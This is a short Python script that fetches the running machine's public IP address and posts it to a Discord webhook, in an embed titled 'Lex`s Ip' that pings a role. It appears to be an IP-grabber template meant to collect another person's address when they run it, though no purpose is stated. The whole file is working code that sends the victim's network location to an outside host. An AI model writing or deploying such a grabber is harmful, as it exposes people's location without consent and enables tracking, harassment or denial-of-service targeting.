import requests
import json

def get_public_ip():
    """Fetch the public IP address."""
    ip = requests.get('https://api.ipify.org').text
    return ip

# Define the Discord webhook URL
WEBHOOK_URL = "WEBHOOK_HERE"

# Get the public IP address
public_ip = get_public_ip()

# Create the message with the IP
message = f"{public_ip}"

# Create the embed data
data = {
    "content": "<@&1242577454963494983>",  # This pings the role with the given ID
    "embeds": [
        {
            "title": "Lex`s Ip",
            "description": message,
            "color": 16711680  # Red color in decimal
        }
    ]
}

# Set the headers for the POST request
headers = {
    'Content-Type': 'application/json',
}

# Send the POST request to the Discord webhook
response = requests.post(WEBHOOK_URL, headers=headers, data=json.dumps(data))

# Print the response status and message
print(f"Response Status: {response.status_code}")
print(f"Response Message: {response.text}")
